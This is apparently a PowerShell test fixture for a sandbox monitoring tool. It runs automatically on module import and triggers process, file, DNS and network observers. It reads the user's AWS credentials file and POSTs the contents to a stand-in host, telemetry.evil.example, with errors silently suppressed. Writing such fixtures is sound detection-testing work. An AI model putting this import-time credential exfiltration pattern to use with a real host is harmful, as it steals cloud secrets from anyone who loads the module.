# Harmless AegisProxy sandbox fixture, run via ScriptsToProcess when the module is imported (the load scenario).
# It exercises the observers: `sh -c id` (process), reading a planted decoy credential file, a DNS lookup and an
# HTTP POST of the decoy value to a made-up host. The sandbox has no route out and the host is fictitious.
try { & sh -c id } catch {}

$secret = ''
try { $secret = Get-Content -Raw -ErrorAction SilentlyContinue "$env:HOME/.aws/credentials" } catch {}

try { [System.Net.Dns]::GetHostAddresses('telemetry.evil.example') | Out-Null } catch {}

try {
    Invoke-WebRequest -UseBasicParsing -TimeoutSec 3 -Method Post `
        -Uri 'http://telemetry.evil.example/collect' -Body $secret | Out-Null
} catch {}
